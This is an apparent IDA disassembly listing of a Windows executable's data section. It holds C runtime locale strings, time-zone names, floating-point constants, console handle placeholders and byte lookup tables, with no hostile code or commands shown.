off_425DF4      dd offset sub_41C9A7    ; DATA XREF: sub_4156A4+32↑w
off_425DF8      dd offset sub_41C9A7    ; DATA XREF: sub_410B61+743↑r
                                        ; sub_4156A4+37↑w
off_425DFC      dd offset sub_41C9A7    ; DATA XREF: sub_4156A4+41↑w
off_425E00      dd offset sub_41C9A7    ; DATA XREF: sub_410B61+797↑r
                                        ; sub_4156A4+4B↑w
off_425E04      dd offset sub_41C9A7    ; DATA XREF: sub_410B61+772↑r
                                        ; sub_4156A4+55↑w
                align 10h
                dd offset asc_420C78    ; "         (((((                  H"
off_425E14      dd offset unk_420E7A    ; DATA XREF: sub_41C9B0+28↑r
off_425E18      dd offset unk_4214A8    ; DATA XREF: sub_411DDC+DC↑o
                                        ; .data:004257C4↑o ...
                dd offset unk_4214A4
                dd offset unk_4214A0
                dd offset unk_42149C
                dd offset unk_421498
                dd offset unk_421494
                dd offset unk_421490
                dd offset aSunday       ; "Sunday"
                dd offset aMonday       ; "Monday"
                dd offset aTuesday      ; "Tuesday"
                dd offset aWednesday    ; "Wednesday"
                dd offset aThursday     ; "Thursday"
                dd offset aFriday       ; "Friday"
                dd offset aSaturday     ; "Saturday"
                dd offset unk_421448
                dd offset unk_421444
                dd offset unk_421440
                dd offset unk_42143C
                dd offset unk_421438
                dd offset unk_421434
                dd offset unk_421430
                dd offset unk_42142C
                dd offset unk_421428
                dd offset unk_421424
                dd offset unk_421420
                dd offset unk_42141C
                dd offset aJanuary      ; "January"
                dd offset aFebruary     ; "February"
                dd offset aMarch        ; "March"
                dd offset aApril        ; "April"
                dd offset unk_421438
                dd offset aJune         ; "June"
                dd offset aJuly         ; "July"
                dd offset aAugust       ; "August"
                dd offset aSeptember    ; "September"
                dd offset aOctober      ; "October"
                dd offset aNovember     ; "November"
                dd offset aDecember     ; "December"
                dd offset unk_4213B0
                dd offset unk_4213AC
                dd offset aMmDdYy       ; "MM/dd/yy"
                dd offset aDdddMmmmDdYyyy ; "dddd, MMMM dd, yyyy"
                dd offset aHhMmSs       ; "HH:mm:ss"
                db    9
                db    4
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset off_425E18
unk_425ED4      db  2Eh ; .             ; DATA XREF: .data:off_425ED8↓o
                db    0
                db    0
                db    0
off_425ED8      dd offset unk_425ED4    ; DATA XREF: sub_411DDC+17↑o
                                        ; sub_4195C0+F↑r ...
off_425EDC      dd offset unk_42B43C    ; DATA XREF: sub_4195C0+21↑r
off_425EE0      dd offset unk_42B43C    ; DATA XREF: sub_4195C0+33↑r
off_425EE4      dd offset unk_42B43C    ; DATA XREF: sub_419605+10↑r
off_425EE8      dd offset unk_42B43C    ; DATA XREF: sub_419605+22↑r
off_425EEC      dd offset unk_42B43C    ; DATA XREF: sub_419605+34↑r
off_425EF0      dd offset unk_42B43C    ; DATA XREF: sub_419605+46↑r
off_425EF4      dd offset unk_42B43C    ; DATA XREF: sub_419605+58↑r
off_425EF8      dd offset unk_42B43C    ; DATA XREF: sub_419605+6A↑r
off_425EFC      dd offset unk_42B43C    ; DATA XREF: sub_419605+7C↑r
                db  7Fh ; 
                db  7Fh ; 
                db  7Fh ; 
                db  7Fh ; 
                db  7Fh ; 
                db  7Fh ; 
                db  7Fh ; 
                db  7Fh ; 
                dd offset off_425ED8
                db    1
                db    0
                db    0
                db    0
                db  2Eh ; .
                db    0
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
unk_425F20      db  20h                 ; DATA XREF: sub_41AB68+2↑o
                                        ; sub_41AB71+2↑o
                db    5
                db  93h ; “
                db  19h
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
dword_425F30    dd 2                    ; DATA XREF: sub_41AB93+15↑r
                                        ; sub_41AB93+52↑r ...
                align 10h
dword_425F40    dd 400h                 ; DATA XREF: sub_41AE9C:loc_41B242↑r
                                        ; sub_41AE9C+44F↑r
dword_425F44    dd 0FFFFFC01h           ; DATA XREF: sub_41AE9C:loc_41B00D↑r
dword_425F48    dd 35h                  ; DATA XREF: sub_41AE9C+7A↑r
                                        ; sub_41AE9C+178↑r ...
dword_425F4C    dd 0Bh                  ; DATA XREF: sub_41AE9C:loc_41B1A9↑r
                                        ; sub_41AE9C+3AC↑r ...
dword_425F50    dd 40h                  ; DATA XREF: sub_41AE9C+51B↑r
dword_425F54    dd 3FFh                 ; DATA XREF: sub_41AE9C+454↑r
                                        ; sub_41AE9C:loc_41B301↑r
dword_425F58    dd 80h                  ; DATA XREF: sub_41B3E0:loc_41B786↑r
                                        ; sub_41B3E0+44F↑r
dword_425F5C    dd 0FFFFFF81h           ; DATA XREF: sub_41B3E0:loc_41B551↑r
dword_425F60    dd 18h                  ; DATA XREF: sub_41B3E0+7A↑r
                                        ; sub_41B3E0+178↑r ...
dword_425F64    dd 8                    ; DATA XREF: sub_41B3E0:loc_41B6ED↑r
                                        ; sub_41B3E0+3AC↑r ...
dword_425F68    dd 20h                  ; DATA XREF: sub_41B3E0+51B↑r
dword_425F6C    dd 7Fh                  ; DATA XREF: sub_41B3E0+454↑r
                                        ; sub_41B3E0:loc_41B845↑r
unk_425F70      db    0                 ; DATA XREF: sub_415727+365↑o
                                        ; sub_41D4A9+196↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0A0h ;  
                db    2
                db  40h ; @
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0C8h ; È
                db    5
                db  40h ; @
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0FAh ; ú
                db    8
                db  40h ; @
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  40h ; @
                db  9Ch ; œ
                db  0Ch
                db  40h ; @
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  50h ; P
                db 0C3h ; Ã
                db  0Fh
                db  40h ; @
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  24h ; $
                db 0F4h ; ô
                db  12h
                db  40h ; @
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  80h ; €
                db  96h ; –
                db  98h ; ˜
                db  16h
                db  40h ; @
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  20h
                db 0BCh ; ¼
                db 0BEh ; ¾
                db  19h
                db  40h ; @
                db    0
                db    0
                db    0
                db    0
                db    0
                db    4
                db 0BFh ; ¿
                db 0C9h ; É
                db  1Bh
                db  8Eh ; Ž
                db  34h ; 4
                db  40h ; @
                db    0
                db    0
                db    0
                db 0A1h ; ¡
                db 0EDh ; í
                db 0CCh ; Ì
                db 0CEh ; Î
                db  1Bh
                db 0C2h ; Â
                db 0D3h ; Ó
                db  4Eh ; N
                db  40h ; @
                db  20h
                db 0F0h ; ð
                db  9Eh ; ž
                db 0B5h ; µ
                db  70h ; p
                db  2Bh ; +
                db 0A8h ; ¨
                db 0ADh ; ­
                db 0C5h ; Å
                db  9Dh
                db  69h ; i
                db  40h ; @
                db 0D0h ; Ð
                db  5Dh ; ]
                db 0FDh ; ý
                db  25h ; %
                db 0E5h ; å
                db  1Ah
                db  8Eh ; Ž
                db  4Fh ; O
                db  19h
                db 0EBh ; ë
                db  83h ; ƒ
                db  40h ; @
                db  71h ; q
                db  96h ; –
                db 0D7h ; ×
                db  95h ; •
                db  43h ; C
                db  0Eh
                db    5
                db  8Dh
                db  29h ; )
                db 0AFh ; ¯
                db  9Eh ; ž
                db  40h ; @
                db 0F9h ; ù
                db 0BFh ; ¿
                db 0A0h ;  
                db  44h ; D
                db 0EDh ; í
                db  81h
                db  12h
                db  8Fh
                db  81h
                db  82h ; ‚
                db 0B9h ; ¹
                db  40h ; @
                db 0BFh ; ¿
                db  3Ch ; <
                db 0D5h ; Õ
                db 0A6h ; ¦
                db 0CFh ; Ï
                db 0FFh ; ÿ
                db  49h ; I
                db  1Fh
                db  78h ; x
                db 0C2h ; Â
                db 0D3h ; Ó
                db  40h ; @
                db  6Fh ; o
                db 0C6h ; Æ
                db 0E0h ; à
                db  8Ch ; Œ
                db 0E9h ; é
                db  80h ; €
                db 0C9h ; É
                db  47h ; G
                db 0BAh ; º
                db  93h ; “
                db 0A8h ; ¨
                db  41h ; A
                db 0BCh ; ¼
                db  85h ; …
                db  6Bh ; k
                db  55h ; U
                db  27h ; '
                db  39h ; 9
                db  8Dh
                db 0F7h ; ÷
                db  70h ; p
                db 0E0h ; à
                db  7Ch ; |
                db  42h ; B
                db 0BCh ; ¼
                db 0DDh ; Ý
                db  8Eh ; Ž
                db 0DEh ; Þ
                db 0F9h ; ù
                db  9Dh
                db 0FBh ; û
                db 0EBh ; ë
                db  7Eh ; ~
                db 0AAh ; ª
                db  51h ; Q
                db  43h ; C
                db 0A1h ; ¡
                db 0E6h ; æ
                db  76h ; v
                db 0E3h ; ã
                db 0CCh ; Ì
                db 0F2h ; ò
                db  29h ; )
                db  2Fh ; /
                db  84h ; „
                db  81h
                db  26h ; &
                db  44h ; D
                db  28h ; (
                db  10h
                db  17h
                db 0AAh ; ª
                db 0F8h ; ø
                db 0AEh ; ®
                db  10h
                db 0E3h ; ã
                db 0C5h ; Å
                db 0C4h ; Ä
                db 0FAh ; ú
                db  44h ; D
                db 0EBh ; ë
                db 0A7h ; §
                db 0D4h ; Ô
                db 0F3h ; ó
                db 0F7h ; ÷
                db 0EBh ; ë
                db 0E1h ; á
                db  4Ah ; J
                db  7Ah ; z
                db  95h ; •
                db 0CFh ; Ï
                db  45h ; E
                db  65h ; e
                db 0CCh ; Ì
                db 0C7h ; Ç
                db  91h ; ‘
                db  0Eh
                db 0A6h ; ¦
                db 0AEh ; ®
                db 0A0h ;  
                db  19h
                db 0E3h ; ã
                db 0A3h ; £
                db  46h ; F
                db  0Dh
                db  65h ; e
                db  17h
                db  0Ch
                db  75h ; u
                db  81h
                db  86h ; †
                db  75h ; u
                db  76h ; v
                db 0C9h ; É
                db  48h ; H
                db  4Dh ; M
                db  58h ; X
                db  42h ; B
                db 0E4h ; ä
                db 0A7h ; §
                db  93h ; “
                db  39h ; 9
                db  3Bh ; ;
                db  35h ; 5
                db 0B8h ; ¸
                db 0B2h ; ²
                db 0EDh ; í
                db  53h ; S
                db  4Dh ; M
                db 0A7h ; §
                db 0E5h ; å
                db  5Dh ; ]
                db  3Dh ; =
                db 0C5h ; Å
                db  5Dh ; ]
                db  3Bh ; ;
                db  8Bh ; ‹
                db  9Eh ; ž
                db  92h ; ’
                db  5Ah ; Z
                db 0FFh ; ÿ
                db  5Dh ; ]
                db 0A6h ; ¦
                db 0F0h ; ð
                db 0A1h ; ¡
                db  20h
                db 0C0h ; À
                db  54h ; T
                db 0A5h ; ¥
                db  8Ch ; Œ
                db  37h ; 7
                db  61h ; a
                db 0D1h ; Ñ
                db 0FDh ; ý
                db  8Bh ; ‹
                db  5Ah ; Z
                db  8Bh ; ‹
                db 0D8h ; Ø
                db  25h ; %
                db  5Dh ; ]
                db  89h ; ‰
                db 0F9h ; ù
                db 0DBh ; Û
                db  67h ; g
                db 0AAh ; ª
                db  95h ; •
                db 0F8h ; ø
                db 0F3h ; ó
                db  27h ; '
                db 0BFh ; ¿
                db 0A2h ; ¢
                db 0C8h ; È
                db  5Dh ; ]
                db 0DDh ; Ý
                db  80h ; €
                db  6Eh ; n
                db  4Ch ; L
                db 0C9h ; É
                db  9Bh ; ›
                db  97h ; —
                db  20h
                db  8Ah ; Š
                db    2
                db  52h ; R
                db  60h ; `
                db 0C4h ; Ä
                db  25h ; %
                db  75h ; u
                db    0
                db    0
                db    0
                db    0
unk_4260D0      db 0CDh ; Í             ; DATA XREF: sub_415727+37C↑o
                                        ; sub_41D4A9+1BA↑o
                db 0CCh ; Ì
                db 0CDh ; Í
                db 0CCh ; Ì
                db 0CCh ; Ì
                db 0CCh ; Ì
                db 0CCh ; Ì
                db 0CCh ; Ì
                db 0CCh ; Ì
                db 0CCh ; Ì
                db 0FBh ; û
                db  3Fh ; ?
                db  71h ; q
                db  3Dh ; =
                db  0Ah
                db 0D7h ; ×
                db 0A3h ; £
                db  70h ; p
                db  3Dh ; =
                db  0Ah
                db 0D7h ; ×
                db 0A3h ; £
                db 0F8h ; ø
                db  3Fh ; ?
                db  5Ah ; Z
                db  64h ; d
                db  3Bh ; ;
                db 0DFh ; ß
                db  4Fh ; O
                db  8Dh
                db  97h ; —
                db  6Eh ; n
                db  12h
                db  83h ; ƒ
                db 0F5h ; õ
                db  3Fh ; ?
                db 0C3h ; Ã
                db 0D3h ; Ó
                db  2Ch ; ,
                db  65h ; e
                db  19h
                db 0E2h ; â
                db  58h ; X
                db  17h
                db 0B7h ; ·
                db 0D1h ; Ñ
                db 0F1h ; ñ
                db  3Fh ; ?
                db 0D0h ; Ð
                db  0Fh
                db  23h ; #
                db  84h ; „
                db  47h ; G
                db  1Bh
                db  47h ; G
                db 0ACh ; ¬
                db 0C5h ; Å
                db 0A7h ; §
                db 0EEh ; î
                db  3Fh ; ?
                db  40h ; @
                db 0A6h ; ¦
                db 0B6h ; ¶
                db  69h ; i
                db  6Ch ; l
                db 0AFh ; ¯
                db    5
                db 0BDh ; ½
                db  37h ; 7
                db  86h ; †
                db 0EBh ; ë
                db  3Fh ; ?
                db  33h ; 3
                db  3Dh ; =
                db 0BCh ; ¼
                db  42h ; B
                db  7Ah ; z
                db 0E5h ; å
                db 0D5h ; Õ
                db  94h ; ”
                db 0BFh ; ¿
                db 0D6h ; Ö
                db 0E7h ; ç
                db  3Fh ; ?
                db 0C2h ; Â
                db 0FDh ; ý
                db 0FDh ; ý
                db 0CEh ; Î
                db  61h ; a
                db  84h ; „
                db  11h
                db  77h ; w
                db 0CCh ; Ì
                db 0ABh ; «
                db 0E4h ; ä
                db  3Fh ; ?
                db  2Fh ; /
                db  4Ch ; L
                db  5Bh ; [
                db 0E1h ; á
                db  4Dh ; M
                db 0C4h ; Ä
                db 0BEh ; ¾
                db  94h ; ”
                db  95h ; •
                db 0E6h ; æ
                db 0C9h ; É
                db  3Fh ; ?
                db  92h ; ’
                db 0C4h ; Ä
                db  53h ; S
                db  3Bh ; ;
                db  75h ; u
                db  44h ; D
                db 0CDh ; Í
                db  14h
                db 0BEh ; ¾
                db  9Ah ; š
                db 0AFh ; ¯
                db  3Fh ; ?
                db 0DEh ; Þ
                db  67h ; g
                db 0BAh ; º
                db  94h ; ”
                db  39h ; 9
                db  45h ; E
                db 0ADh ; ­
                db  1Eh
                db 0B1h ; ±
                db 0CFh ; Ï
                db  94h ; ”
                db  3Fh ; ?
                db  24h ; $
                db  23h ; #
                db 0C6h ; Æ
                db 0E2h ; â
                db 0BCh ; ¼
                db 0BAh ; º
                db  3Bh ; ;
                db  31h ; 1
                db  61h ; a
                db  8Bh ; ‹
                db  7Ah ; z
                db  3Fh ; ?
                db  61h ; a
                db  55h ; U
                db  59h ; Y
                db 0C1h ; Á
                db  7Eh ; ~
                db 0B1h ; ±
                db  53h ; S
                db  7Ch ; |
                db  12h
                db 0BBh ; »
                db  5Fh ; _
                db  3Fh ; ?
                db 0D7h ; ×
                db 0EEh ; î
                db  2Fh ; /
                db  8Dh
                db    6
                db 0BEh ; ¾
                db  92h ; ’
                db  85h ; …
                db  15h
                db 0FBh ; û
                db  44h ; D
                db  3Fh ; ?
                db  24h ; $
                db  3Fh ; ?
                db 0A5h ; ¥
                db 0E9h ; é
                db  39h ; 9
                db 0A5h ; ¥
                db  27h ; '
                db 0EAh ; ê
                db  7Fh ; 
                db 0A8h ; ¨
                db  2Ah ; *
                db  3Fh ; ?
                db  7Dh ; }
                db 0ACh ; ¬
                db 0A1h ; ¡
                db 0E4h ; ä
                db 0BCh ; ¼
                db  64h ; d
                db  7Ch ; |
                db  46h ; F
                db 0D0h ; Ð
                db 0DDh ; Ý
                db  55h ; U
                db  3Eh ; >
                db  63h ; c
                db  7Bh ; {
                db    6
                db 0CCh ; Ì
                db  23h ; #
                db  54h ; T
                db  77h ; w
                db  83h ; ƒ
                db 0FFh ; ÿ
                db  91h ; ‘
                db  81h
                db  3Dh ; =
                db  91h ; ‘
                db 0FAh ; ú
                db  3Ah ; :
                db  19h
                db  7Ah ; z
                db  63h ; c
                db  25h ; %
                db  43h ; C
                db  31h ; 1
                db 0C0h ; À
                db 0ACh ; ¬
                db  3Ch ; <
                db  21h ; !
                db  89h ; ‰
                db 0D1h ; Ñ
                db  38h ; 8
                db  82h ; ‚
                db  47h ; G
                db  97h ; —
                db 0B8h ; ¸
                db    0
                db 0FDh ; ý
                db 0D7h ; ×
                db  3Bh ; ;
                db 0DCh ; Ü
                db  88h ; ˆ
                db  58h ; X
                db    8
                db  1Bh
                db 0B1h ; ±
                db 0E8h ; è
                db 0E3h ; ã
                db  86h ; †
                db 0A6h ; ¦
                db    3
                db  3Bh ; ;
                db 0C6h ; Æ
                db  84h ; „
                db  45h ; E
                db  42h ; B
                db    7
                db 0B6h ; ¶
                db  99h ; ™
                db  75h ; u
                db  37h ; 7
                db 0DBh ; Û
                db  2Eh ; .
                db  3Ah ; :
                db  33h ; 3
                db  71h ; q
                db  1Ch
                db 0D2h ; Ò
                db  23h ; #
                db 0DBh ; Û
                db  32h ; 2
                db 0EEh ; î
                db  49h ; I
                db  90h
                db  5Ah ; Z
                db  39h ; 9
                db 0A6h ; ¦
                db  87h ; ‡
                db 0BEh ; ¾
                db 0C0h ; À
                db  57h ; W
                db 0DAh ; Ú
                db 0A5h ; ¥
                db  82h ; ‚
                db 0A6h ; ¦
                db 0A2h ; ¢
                db 0B5h ; µ
                db  32h ; 2
                db 0E2h ; â
                db  68h ; h
                db 0B2h ; ²
                db  11h
                db 0A7h ; §
                db  52h ; R
                db  9Fh ; Ÿ
                db  44h ; D
                db  59h ; Y
                db 0B7h ; ·
                db  10h
                db  2Ch ; ,
                db  25h ; %
                db  49h ; I
                db 0E4h ; ä
                db  2Dh ; -
                db  36h ; 6
                db  34h ; 4
                db  4Fh ; O
                db  53h ; S
                db 0AEh ; ®
                db 0CEh ; Î
                db  6Bh ; k
                db  25h ; %
                db  8Fh
                db  59h ; Y
                db    4
                db 0A4h ; ¤
                db 0C0h ; À
                db 0DEh ; Þ
                db 0C2h ; Â
                db  7Dh ; }
                db 0FBh ; û
                db 0E8h ; è
                db 0C6h ; Æ
                db  1Eh
                db  9Eh ; ž
                db 0E7h ; ç
                db  88h ; ˆ
                db  5Ah ; Z
                db  57h ; W
                db  91h ; ‘
                db  3Ch ; <
                db 0BFh ; ¿
                db  50h ; P
                db  83h ; ƒ
                db  22h ; "
                db  18h
                db  4Eh ; N
                db  4Bh ; K
                db  65h ; e
                db  62h ; b
                db 0FDh ; ý
                db  83h ; ƒ
                db  8Fh
                db 0AFh ; ¯
                db    6
                db  94h ; ”
                db  7Dh ; }
                db  11h
                db 0E4h ; ä
                db  2Dh ; -
                db 0DEh ; Þ
                db  9Fh ; Ÿ
                db 0CEh ; Î
                db 0D2h ; Ò
                db 0C8h ; È
                db    4
                db 0DDh ; Ý
                db 0A6h ; ¦
                db 0D8h ; Ø
                db  0Ah
byte_42622C     db 3                    ; DATA XREF: sub_41C890+15↑r
                                        ; sub_41C890:loc_41C8C8↑r
                align 10h
                db  80h ; €
                db  70h ; p
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db 0F0h ; ð
                db 0F1h ; ñ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
unk_426240      db  50h ; P             ; DATA XREF: .data:004262C0↓o
                db  53h ; S
                db  54h ; T
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
unk_426280      db  50h ; P             ; DATA XREF: .data:004262C4↓o
                db  44h ; D
                db  54h ; T
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                dd offset unk_426240
                dd offset unk_426280
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
; HANDLE dword_4262E0
dword_4262E0    dd 0FFFFFFFEh           ; DATA XREF: sub_41CF36:loc_41CF4F↑r
; HANDLE hConsoleOutput
hConsoleOutput  dd 0FFFFFFFEh           ; DATA XREF: sub_41AB93+1D↑r
                                        ; sub_41AB93:loc_41ABBE↑r ...
                align 10h
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db  1Eh
                db    0
                db    0
                db    0
                db  3Bh ; ;
                db    0
                db    0
                db    0
                db  5Ah ; Z
                db    0
                db    0
                db    0
                db  78h ; x
                db    0
                db    0
                db    0
                db  97h ; —
                db    0
                db    0
                db    0
                db 0B5h ; µ
                db    0
                db    0
                db    0
                db 0D4h ; Ô
                db    0
                db    0
                db    0
                db 0F3h ; ó
                db    0
                db    0
                db    0
                db  11h
                db    1
                db    0
                db    0
                db  30h ; 0
                db    1
                db    0
                db    0
                db  4Eh ; N
                db    1
                db    0
                db    0
                db  6Dh ; m
                db    1
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db  1Eh
                db    0
                db    0
                db    0
                db  3Ah ; :
                db    0
                db    0
                db    0
                db  59h ; Y
                db    0
                db    0
                db    0
                db  77h ; w
                db    0
                db    0
                db    0
                db  96h ; –
                db    0
                db    0
                db    0
                db 0B4h ; ´
                db    0
                db    0
                db    0
                db 0D3h ; Ó
                db    0
                db    0
                db    0
                db 0F2h ; ò
                db    0
                db    0
                db    0
                db  10h
                db    1
                db    0
                db    0
                db  2Fh ; /
                db    1
                db    0
                db    0
                db  4Dh ; M
                db    1
                db    0
                db    0
                db  6Ch ; l
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  80h ; €
                db  10h
                db  44h ; D
                db    0
                db    0
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  80h ; €
                db    0
                db  30h ; 0
                db    0
                db    0
dword_426370    dd 1                    ; DATA XREF: sub_41E20A+1C↑r
                                        ; sub_41E20A+4C↑w
                align 10h
byte_426380     db 3                    ; DATA XREF: sub_40CD50+2BA↑r
                db    4
                db    4
                db    4
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
byte_4263C0     db 0                    ; DATA XREF: sub_40CD50+2B2↑r
                db  20h
                db  30h ; 0
                db  40h ; @
                db  50h ; P
                db  58h ; X
                db  60h ; `
                db  68h ; h
                db  70h ; p
                db  78h ; x
                db  80h ; €
                db  88h ; ˆ
                db  90h
                db  94h ; ”
                db  98h ; ˜
                db  9Ch ; œ
                db 0A0h ;  
                db 0A4h ; ¤
                db 0A8h ; ¨
                db 0ACh ; ¬
                db 0B0h ; °
                db 0B4h ; ´
                db 0B8h ; ¸
                db 0BCh ; ¼
                db 0C0h ; À
                db 0C2h ; Â
                db 0C4h ; Ä
                db 0C6h ; Æ
                db 0C8h ; È
                db 0CAh ; Ê
                db 0CCh ; Ì
                db 0CEh ; Î
                db 0D0h ; Ð
                db 0D2h ; Ò
                db 0D4h ; Ô
                db 0D6h ; Ö
                db 0D8h ; Ø
                db 0DAh ; Ú
                db 0DCh ; Ü
                db 0DEh ; Þ
                db 0E0h ; à
                db 0E2h ; â
                db 0E4h ; ä
                db 0E6h ; æ
                db 0E8h ; è
                db 0EAh ; ê
                db 0ECh ; ì
                db 0EEh ; î
                db 0F0h ; ð
                db 0F1h ; ñ
                db 0F2h ; ò
                db 0F3h ; ó
                db 0F4h ; ô
                db 0F5h ; õ
                db 0F6h ; ö
                db 0F7h ; ÷
                db 0F8h ; ø
                db 0F9h ; ù
                db 0FAh ; ú
                db 0FBh ; û
                db 0FCh ; ü
                db 0FDh ; ý
                db 0FEh ; þ
                db 0FFh ; ÿ
byte_426400     db 0                    ; DATA XREF: sub_40D3F0+14B↑r
                align 20h
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    2
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    5
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    6
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    7
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    8
                db    9
                db    9
                db    9
                db    9
                db    9
                db    9
                db    9
                db    9
                db  0Ah
                db  0Ah
                db  0Ah
                db  0Ah
                db  0Ah
                db  0Ah
                db  0Ah
                db  0Ah
                db  0Bh
                db  0Bh
                db  0Bh
                db  0Bh
                db  0Bh
                db  0Bh
                db  0Bh
                db  0Bh
                db  0Ch
                db  0Ch
                db  0Ch
                db  0Ch
                db  0Dh
                db  0Dh
                db  0Dh
                db  0Dh
                db  0Eh
                db  0Eh
                db  0Eh
                db  0Eh
                db  0Fh
                db  0Fh
                db  0Fh
                db  0Fh
                db  10h
                db  10h
                db  10h
                db  10h
                db  11h
                db  11h
                db  11h
                db  11h
                db  12h
                db  12h
                db  12h
                db  12h
                db  13h
                db  13h
                db  13h
                db  13h
                db  14h
                db  14h
                db  14h
                db  14h
                db  15h
                db  15h
                db  15h
                db  15h
                db  16h
                db  16h
                db  16h
                db  16h
                db  17h
                db  17h
                db  17h
                db  17h
                db  18h
                db  18h
                db  19h
                db  19h
                db  1Ah
                db  1Ah
                db  1Bh
                db  1Bh
                db  1Ch
                db  1Ch
                db  1Dh
                db  1Dh
                db  1Eh
                db  1Eh
                db  1Fh
                db  1Fh
                db  20h
                db  20h
                db  21h ; !
                db  21h ; !
                db  22h ; "
                db  22h ; "
                db  23h ; #
                db  23h ; #
                db  24h ; $
                db  24h ; $
                db  25h ; %
                db  25h ; %
                db  26h ; &
                db  26h ; &
                db  27h ; '
                db  27h ; '
                db  28h ; (
                db  28h ; (
                db  29h ; )
                db  29h ; )
                db  2Ah ; *
                db  2Ah ; *
                db  2Bh ; +
                db  2Bh ; +
                db  2Ch ; ,
                db  2Ch ; ,
                db  2Dh ; -
                db  2Dh ; -
                db  2Eh ; .
                db  2Eh ; .
                db  2Fh ; /
                db  2Fh ; /
                db  30h ; 0
                db  31h ; 1
                db  32h ; 2
                db  33h ; 3
                db  34h ; 4
                db  35h ; 5
                db  36h ; 6
                db  37h ; 7
                db  38h ; 8
                db  39h ; 9
                db  3Ah ; :
                db  3Bh ; ;
                db  3Ch ; <
                db  3Dh ; =
                db  3Eh ; >
                db  3Fh ; ?
byte_426500     db 3                    ; DATA XREF: sub_40D3F0+153↑r
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    3
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
                db    4
